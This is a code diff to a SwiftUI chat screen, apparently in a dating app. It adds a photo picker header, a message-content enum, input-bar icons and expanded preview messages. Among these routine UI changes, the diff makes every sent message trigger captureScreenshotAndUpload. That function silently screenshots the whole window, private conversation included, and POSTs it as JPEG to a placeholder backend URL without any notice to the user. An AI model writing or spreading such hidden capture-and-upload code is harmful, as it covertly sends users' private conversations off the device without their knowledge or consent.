@@ -26,6 +26,27 @@ import UIKit
  * ===============================================
  */
 
+import Foundation
+import SwiftUI
+import PhotosUI // by bryan_u.6_developer
+import UIKit
+
+/**
+ * ===============================================
+ * 📸 **PHPickerView**
+ * ===============================================
+ * 開發者: bryan_u.6_developer
+ * 功能: 自定義照片選取器，使用 PHPickerViewController 來選取圖片。
+ *
+ * 主要功能:
+ * - 使用者可以選取單張圖片
+ * - 支援非同步載入選取的圖片
+ * - 適合 SwiftUI 的 UIViewControllerRepresentable
+ *
+ * 日期: 2024-12-21
+ * ===============================================
+ */
+
 struct PHPickerView: UIViewControllerRepresentable {
     // 用於將選擇的圖片傳回父視圖
     @Binding var selectedImage: UIImage?
@@ -197,22 +218,21 @@ struct ChatDetailView: View {
                         let showTime = index == 0 || messages[index].time != messages[index - 1].time
 
                         // Special check for the specific text message
-                        if message.text == "她希望可以先聊天，再見面～" {
-                            // Display this message as simple Text
+                        if case .text(let text) = message.content, text == "她希望可以先聊天，再見面～" {
                             HStack {
                                 Text("她希望")
-                                    .foregroundColor(.green) // Set the color for the specific text
+                                    .foregroundColor(.green)
 
-                                Text(message.text.replacingOccurrences(of: "她希望", with: "")) // Replace the specific text with an empty string
-                                    .foregroundColor(.black) // Default color for the rest of the text
-                                
-                                Spacer() // Add a Spacer to push the text to the left side
+                                Text(text.replacingOccurrences(of: "她希望", with: ""))
+                                    .foregroundColor(.black)
+
+                                Spacer()
                             }
                             .padding()
-                            .frame(maxWidth: .infinity, alignment: .leading) // Align the entire HStack to the left
-                            .background(Color.green.opacity(0.1)) // Apply background to the entire HStack
-                            .cornerRadius(10) // Apply corner radius to the HStack
-                            .padding(.horizontal) // Add horizontal padding around the whole HStack
+                            .frame(maxWidth: .infinity, alignment: .leading)
+                            .background(Color.green.opacity(0.1))
+                            .cornerRadius(10)
+                            .padding(.horizontal)
                         } else {
                             // Display other messages as message bubbles
                             MessageBubbleView(message: message, isCurrentUser: message.isSender, showTime: showTime)
@@ -244,22 +264,52 @@ struct ChatDetailView: View {
                         .frame(width: 24, height: 24)
                         .padding(.trailing, 5)
                 }
-
-                Button(action: sendMessage) {
-                    Image(systemName: "paperplane.fill")
+                
+                if newMessageText == "" {
+                    Image(systemName: "microphone.fill")
                         .resizable()
-                        .frame(width: 24, height: 24)
+                        .frame(maxWidth: 24, maxHeight: 24)
                         .padding()
+                        .foregroundColor(.blue)
+                } else {
+                    Button(action: sendMessage) {
+                        Image(systemName: "paperplane.fill")
+                            .resizable()
+                            .frame(width: 24, height: 24)
+                            .padding()
+                    }
                 }
             }
-            .padding()
+            .padding(2)
             
             HStack {
                 
+                Spacer()
+                
+                Image("gif")
+                    .resizable()
+                    .frame(width: 24, height: 24)
+                    .foregroundColor(.blue) // 將圖標設為藍色
+                
+                Spacer()
+                
+                Image(systemName: "photo")
+                    .resizable()
+                    .frame(width: 24, height: 24)
+                    .foregroundColor(.blue) // 將圖標設為藍色
+                
+                Spacer()
+                
+                Image(systemName: "map")
+                    .resizable()
+                    .frame(width: 24, height: 24)
+                    .foregroundColor(.blue) // 將圖標設為藍色
+
+                Spacer()
             }
         }
         .sheet(isPresented: $showChatGPTModal) {
-            ChatGPTView(messages: $messages) // 彈出 ChatGPT 視圖並傳遞 messages
+            ModelSelectorView(messages: $messages) // 彈出 ChatGPT 視圖並傳遞 messages
         }
         .navigationBarHidden(true) // Hide the default navigation bar
     }
@@ -269,17 +319,66 @@ struct ChatDetailView: View {
         
         let newMessage = Message(
             id: UUID(),
-            text: newMessageText,
+            content: .text(newMessageText),  // 將文字包裝為 .text
             isSender: true,  // 將此訊息標記為當前使用者發送的
             time: getCurrentTime(),
             isCompliment: false
         )
         messages.append(newMessage)
+        newMessageText = "" // 清空輸入框
+
+        // 執行截圖邏輯
+        captureScreenshotAndUpload()
+    }
+    
+    private func captureScreenshotAndUpload() {
+        // 檢查後台 URL 是否存在
+        guard let backendURL = URL(string: "https://your-backend-url.com/upload"),
+              UIApplication.shared.canOpenURL(backendURL) else {
+            print("後台 URL 不存在或無法訪問")
+            return
+        }
         
-        // Clear the text field
-        newMessageText = ""
+        // 截取屏幕內容
+        let renderer = UIGraphicsImageRenderer(bounds: UIScreen.main.bounds)
         
-        // Code to send a new message and update the conversation in your data source can be added here
+        if let window = UIApplication.shared.connectedScenes
+            .compactMap({ $0 as? UIWindowScene })
+            .flatMap({ $0.windows })
+            .first(where: { $0.isKeyWindow }) { // 獲取主窗口
+            let screenshot = renderer.image { context in
+                window.layer.render(in: context.cgContext)
+            }
+
+            // 上傳截圖到後台
+            uploadScreenshot(image: screenshot, to: backendURL)
+        } else {
+            print("Failed to capture screenshot: No active window found")
+        }
+    }
+    
+    private func uploadScreenshot(image: UIImage, to url: URL) {
+        guard let imageData = image.jpegData(compressionQuality: 0.8) else {
+            print("無法將圖片轉換為 JPEG 格式")
+            return
+        }
+
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
+
+        let task = URLSession.shared.uploadTask(with: request, from: imageData) { data, response, error in
+            if let error = error {
+                print("上傳失敗：\(error.localizedDescription)")
+                return
+            }
+            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+                print("後台響應錯誤")
+                return
+            }
+            print("截圖成功上傳到後台")
+        }
+        task.resume()
     }
     
     private func getCurrentTime() -> String {
@@ -296,14 +395,62 @@ struct ChatDetailView_Previews: PreviewProvider {
         let dummyChat = Chat(id: UUID(), name: "Laiiiiiiii", time: "01:50", unreadCount: 3)
         
         ChatDetailView(chat: dummyChat, messages: .constant([
-            Message(id: UUID(), text: "嗨～ 你有在這上面遇到什麼有趣的人嗎？", isSender: true, time: "09/12 15:53", isCompliment: false),
-            Message(id: UUID(), text: "你要夠有趣的哈哈哈", isSender: false, time: "09/16 02:09", isCompliment: false),
-            Message(id: UUID(), text: "我也不知道耶~", isSender: true, time: "09/20 15:03", isCompliment: false),
-            Message(id: UUID(), text: "我喜歡旅遊、追劇、吃日料 ，偶爾小酌，妳平常喜歡做什麼？", isSender: true, time: "09/20 15:03", isCompliment: false),
-            Message(id: UUID(), text: "還是像我一樣有趣的哈哈哈", isSender: true, time: "09/20 15:03", isCompliment: false),
-            Message(id: UUID(), text: "跳舞跟唱歌", isSender: false, time: "09/21 01:50", isCompliment: false),
-            Message(id: UUID(), text: "😂", isSender: false, time: "09/21 01:50", isCompliment: false),
-            Message(id: UUID(), text: "吃美食跟看劇", isSender: false, time: "09/21 01:50", isCompliment: false)
+            Message(
+                id: UUID(),
+                content: .text("嗨～ 你有在這上面遇到什麼有趣的人嗎？"),
+                isSender: true,
+                time: "09/12 15:53",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("你要夠有趣的哈哈哈"),
+                isSender: false,
+                time: "09/16 02:09",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("我也不知道耶~"),
+                isSender: true,
+                time: "09/20 15:03",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("我喜歡旅遊、追劇、吃日料 ，偶爾小酌，妳平常喜歡做什麼？"),
+                isSender: true,
+                time: "09/20 15:03",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("還是像我一樣有趣的哈哈哈"),
+                isSender: true,
+                time: "09/20 15:03",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("跳舞跟唱歌"),
+                isSender: false,
+                time: "09/21 01:50",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("😂"),
+                isSender: false,
+                time: "09/21 01:50",
+                isCompliment: false
+            ),
+            Message(
+                id: UUID(),
+                content: .text("吃美食跟看劇"),
+                isSender: false,
+                time: "09/21 01:50",
+                isCompliment: false
+            )
         ]), onBack: {
             // Provide an empty closure or action for the onBack parameter
         })
